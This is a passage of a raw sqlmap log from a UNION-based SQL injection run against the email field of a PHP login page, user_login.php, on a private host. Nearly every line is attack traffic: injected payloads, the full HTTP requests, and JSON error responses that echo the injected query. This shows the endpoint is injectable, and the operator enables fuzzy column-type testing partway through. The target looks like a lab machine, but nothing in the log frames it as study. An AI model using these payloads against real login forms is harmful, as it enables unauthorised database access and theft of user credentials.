Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-9276%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4346547873736b5967766573596850576a6b714250584d70705777694358654f7945554f666d435a%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-9276' UNION ALL SELECT CONCAT(0x7176766b71,0x4346547873736b5967766573596850576a6b714250584d70705777694358654f7945554f666d435a,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] -1617' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x694478704e7579455159535558786954446744716e6f626c747449537a4f78617762424f5a597272,0x7176766b71),NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#73]:
GET /ai/includes/user_login.php?email=-1617%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x694478704e7579455159535558786954446744716e6f626c747449537a4f78617762424f5a597272%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#73] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-1617%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x694478704e7579455159535558786954446744716e6f626c747449537a4f78617762424f5a597272%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-1617' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x694478704e7579455159535558786954446744716e6f626c747449537a4f78617762424f5a597272,0x7176766b71),NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] -2543' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4a5a636579734968455879596f4f6672544a6453665354704c72586a6f75515773796e427978456d,0x7176766b71),NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#74]:
GET /ai/includes/user_login.php?email=-2543%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4a5a636579734968455879596f4f6672544a6453665354704c72586a6f75515773796e427978456d%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#74] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-2543%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4a5a636579734968455879596f4f6672544a6453665354704c72586a6f75515773796e427978456d%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-2543' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4a5a636579734968455879596f4f6672544a6453665354704c72586a6f75515773796e427978456d,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:18] [PAYLOAD] -2537' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x7542744151737953416e457a574a4c79686570766d4a4c7279674c534a6f75446a6d4e677a664a70,0x7176766b71)-- -
[03:42:18] [TRAFFIC OUT] HTTP request [#75]:
GET /ai/includes/user_login.php?email=-2537%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x7542744151737953416e457a574a4c79686570766d4a4c7279674c534a6f75446a6d4e677a664a70%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#75] (200 OK):
Date: Sun, 19 Oct 2025 07:42:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-2537%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x7542744151737953416e457a574a4c79686570766d4a4c7279674c534a6f75446a6d4e677a664a70%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-2537' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x7542744151737953416e457a574a4c79686570766d4a4c7279674c534a6f75446a6d4e677a664a70,0x7176766b71)-- -'"
    ]
}
[03:42:18] [PAYLOAD] -3141' UNION ALL SELECT CONCAT(0x7176766b71,0x434b4f74546e66597251,0x7176766b71),NULL,NULL,NULL-- -
[03:42:18] [TRAFFIC OUT] HTTP request [#76]:
GET /ai/includes/user_login.php?email=-3141%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x434b4f74546e66597251%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#76] (200 OK):
Date: Sun, 19 Oct 2025 07:42:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3141%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x434b4f74546e66597251%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3141' UNION ALL SELECT CONCAT(0x7176766b71,0x434b4f74546e66597251,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:18] [PAYLOAD] -3955' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x524355594d6d6a615450,0x7176766b71),NULL-- -
[03:42:18] [TRAFFIC OUT] HTTP request [#77]:
GET /ai/includes/user_login.php?email=-3955%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x524355594d6d6a615450%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#77] (200 OK):
Date: Sun, 19 Oct 2025 07:42:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3955%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x524355594d6d6a615450%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3955' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x524355594d6d6a615450,0x7176766b71),NULL-- -'"
    ]
}
[03:42:18] [PAYLOAD] -6377' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x75686d56616a677a7453,0x7176766b71),NULL,NULL-- -
[03:42:18] [TRAFFIC OUT] HTTP request [#78]:
GET /ai/includes/user_login.php?email=-6377%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x75686d56616a677a7453%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#78] (200 OK):
Date: Sun, 19 Oct 2025 07:42:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6377%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x75686d56616a677a7453%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6377' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x75686d56616a677a7453,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:18] [PAYLOAD] -7657' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x4e72696e676d764a7a63,0x7176766b71)-- -
[03:42:18] [TRAFFIC OUT] HTTP request [#79]:
GET /ai/includes/user_login.php?email=-7657%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4e72696e676d764a7a63%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:18] [TRAFFIC IN] HTTP response [#79] (200 OK):
Date: Sun, 19 Oct 2025 07:42:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-7657%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4e72696e676d764a7a63%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-7657' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x4e72696e676d764a7a63,0x7176766b71)-- -'"
    ]
}
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
Y
[03:42:24] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x4e556a6c47574e4b6d734f47744a75454a59484175527150544c685262687666794d4e456e636155,0x7176766b71),67-- -
[03:42:24] [TRAFFIC OUT] HTTP request [#80]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x4e556a6c47574e4b6d734f47744a75454a59484175527150544c685262687666794d4e456e636155%2C0x7176766b71%29%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:24] [TRAFFIC IN] HTTP response [#80] (200 OK):
Date: Sun, 19 Oct 2025 07:42:24 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x4e556a6c47574e4b6d734f47744a75454a59484175527150544c685262687666794d4e456e636155%2C0x7176766b71%29%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x4e556a6c47574e4b6d734f47744a75454a59484175527150544c685262687666794d4e456e636155,0x7176766b71),67-- -'"
    ]
}
[03:42:24] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x49734b45507871706e65687059416a6a564f6662415a4f456f4166706a6a5a456645617a436b6f4f,0x7176766b71)-- -
[03:42:24] [TRAFFIC OUT] HTTP request [#81]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x49734b45507871706e65687059416a6a564f6662415a4f456f4166706a6a5a456645617a436b6f4f%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:24] [TRAFFIC IN] HTTP response [#81] (200 OK):
Date: Sun, 19 Oct 2025 07:42:24 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x49734b45507871706e65687059416a6a564f6662415a4f456f4166706a6a5a456645617a436b6f4f%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x49734b45507871706e65687059416a6a564f6662415a4f456f4166706a6a5a456645617a436b6f4f,0x7176766b71)-- -'"
    ]
}
[03:42:24] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x77576a434949687149727667534f4172414763506a72524a4c505a5362666a7a727a477a7a785569,0x7176766b71),67,67,67-- -
[03:42:24] [TRAFFIC OUT] HTTP request [#82]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x77576a434949687149727667534f4172414763506a72524a4c505a5362666a7a727a477a7a785569%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#82] (200 OK):
Date: Sun, 19 Oct 2025 07:42:24 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x77576a434949687149727667534f4172414763506a72524a4c505a5362666a7a727a477a7a785569%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x77576a434949687149727667534f4172414763506a72524a4c505a5362666a7a727a477a7a785569,0x7176766b71),67,67,67-- -'"
    ]
}
[03:42:25] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x514d44447a6359636e4a79624b6b56446c424354544f4462635a5264766f7566516e4c45586b4f42,0x7176766b71),67,67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#83]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x514d44447a6359636e4a79624b6b56446c424354544f4462635a5264766f7566516e4c45586b4f42%2C0x7176766b71%29%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#83] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x514d44447a6359636e4a79624b6b56446c424354544f4462635a5264766f7566516e4c45586b4f42%2C0x7176766b71%29%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x514d44447a6359636e4a79624b6b56446c424354544f4462635a5264766f7566516e4c45586b4f42,0x7176766b71),67,67-- -'"
    ]
}
[03:42:25] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x51454870666a68444a4f,0x7176766b71),67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#84]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x51454870666a68444a4f%2C0x7176766b71%29%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#84] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x51454870666a68444a4f%2C0x7176766b71%29%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x51454870666a68444a4f,0x7176766b71),67-- -'"
    ]
}
[03:42:25] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x474d445258764d4c6449,0x7176766b71)-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#85]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x474d445258764d4c6449%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#85] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x474d445258764d4c6449%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x474d445258764d4c6449,0x7176766b71)-- -'"
    ]
}
[03:42:25] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x4f57656c554167587061,0x7176766b71),67,67,67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#86]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f57656c554167587061%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#86] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f57656c554167587061%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x4f57656c554167587061,0x7176766b71),67,67,67-- -'"
    ]
}
[03:42:25] [PAYLOAD] test@chatai.com' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x44726770794676617046,0x7176766b71),67,67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#87]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x44726770794676617046%2C0x7176766b71%29%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#87] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x44726770794676617046%2C0x7176766b71%29%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x44726770794676617046,0x7176766b71),67,67-- -'"
    ]
}
[03:42:25] [PAYLOAD] -7333' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x7062416b587868547476506767526977664a414a5947474f4d4b6d706555535850777a59466b6e54,0x7176766b71)-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#88]:
GET /ai/includes/user_login.php?email=-7333%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x7062416b587868547476506767526977664a414a5947474f4d4b6d706555535850777a59466b6e54%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#88] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-7333%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x7062416b587868547476506767526977664a414a5947474f4d4b6d706555535850777a59466b6e54%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-7333' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x7062416b587868547476506767526977664a414a5947474f4d4b6d706555535850777a59466b6e54,0x7176766b71)-- -'"
    ]
}
[03:42:25] [PAYLOAD] -4275' UNION ALL SELECT CONCAT(0x7176766b71,0x4d786769664e6b4c64445353476344577a4a516b64436c526b507a71495348634f526a4e4f436272,0x7176766b71),67,67,67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#89]:
GET /ai/includes/user_login.php?email=-4275%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4d786769664e6b4c64445353476344577a4a516b64436c526b507a71495348634f526a4e4f436272%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#89] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-4275%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4d786769664e6b4c64445353476344577a4a516b64436c526b507a71495348634f526a4e4f436272%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-4275' UNION ALL SELECT CONCAT(0x7176766b71,0x4d786769664e6b4c64445353476344577a4a516b64436c526b507a71495348634f526a4e4f436272,0x7176766b71),67,67,67-- -'"
    ]
}
[03:42:25] [PAYLOAD] -4186' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x706e537157754a5a5a764c5949464776484874776b4f515a634974724d4e4e5972677a6d434f6477,0x7176766b71),67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#90]:
GET /ai/includes/user_login.php?email=-4186%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x706e537157754a5a5a764c5949464776484874776b4f515a634974724d4e4e5972677a6d434f6477%2C0x7176766b71%29%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:25] [TRAFFIC IN] HTTP response [#90] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-4186%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x706e537157754a5a5a764c5949464776484874776b4f515a634974724d4e4e5972677a6d434f6477%2C0x7176766b71%29%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-4186' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x706e537157754a5a5a764c5949464776484874776b4f515a634974724d4e4e5972677a6d434f6477,0x7176766b71),67-- -'"
    ]
}
[03:42:25] [PAYLOAD] -5114' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x764c68505753575070424c6263566e45755545445045794d675567774d4f6d584b6d736a5543507a,0x7176766b71),67,67-- -
[03:42:25] [TRAFFIC OUT] HTTP request [#91]:
GET /ai/includes/user_login.php?email=-5114%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x764c68505753575070424c6263566e45755545445045794d675567774d4f6d584b6d736a5543507a%2C0x7176766b71%29%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#91] (200 OK):
Date: Sun, 19 Oct 2025 07:42:25 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-5114%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x764c68505753575070424c6263566e45755545445045794d675567774d4f6d584b6d736a5543507a%2C0x7176766b71%29%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-5114' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x764c68505753575070424c6263566e45755545445045794d675567774d4f6d584b6d736a5543507a,0x7176766b71),67,67-- -'"
    ]
}
[03:42:26] [PAYLOAD] -1261' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x676c53766d6f727a4862,0x7176766b71)-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#92]:
GET /ai/includes/user_login.php?email=-1261%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x676c53766d6f727a4862%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#92] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-1261%27%20UNION%20ALL%20SELECT%2067%2C67%2C67%2CCONCAT%280x7176766b71%2C0x676c53766d6f727a4862%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-1261' UNION ALL SELECT 67,67,67,CONCAT(0x7176766b71,0x676c53766d6f727a4862,0x7176766b71)-- -'"
    ]
}
[03:42:26] [PAYLOAD] -2120' UNION ALL SELECT CONCAT(0x7176766b71,0x4f48674145486f685878,0x7176766b71),67,67,67-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#93]:
GET /ai/includes/user_login.php?email=-2120%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f48674145486f685878%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
